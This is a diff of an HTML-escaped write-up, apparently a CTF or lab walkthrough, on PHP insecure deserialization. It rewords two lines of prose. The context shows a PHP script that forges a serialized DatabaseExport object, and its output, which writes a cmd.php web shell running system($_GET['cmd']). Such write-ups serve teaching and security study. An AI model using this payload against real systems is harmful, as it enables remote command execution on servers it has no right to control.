@@ -136,7 +136,7 @@ $app -&amp;gt; update_db();
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&amp;ndash;&amp;gt; PHP Insecure Deserialization&lt;/p&gt;
 &lt;p&gt;We can actually create a simple cmd shell&lt;/p&gt;
-&lt;p&gt;This is the payload we can to serialize&lt;/p&gt;
+&lt;p&gt;We&amp;rsquo;ll use this php script to forge our serialized payload&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
 class DatabaseExport
 {
@@ -148,7 +148,7 @@ $bad= new DatabaseExport;
 echo serialize($bad);
 ?&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;running this php script will give us&lt;/p&gt;
+&lt;p&gt;Output:&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;O:14:&amp;quot;DatabaseExport&amp;quot;:2:{s:9:&amp;quot;user_file&amp;quot;;s:7:&amp;quot;cmd.php&amp;quot;;s:4:&amp;quot;data&amp;quot;;s:28:&amp;quot;&amp;lt;?php system($_GET[&amp;quot;cmd&amp;quot;])?&amp;gt;&amp;quot;;}
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;our final payload&lt;/p&gt;
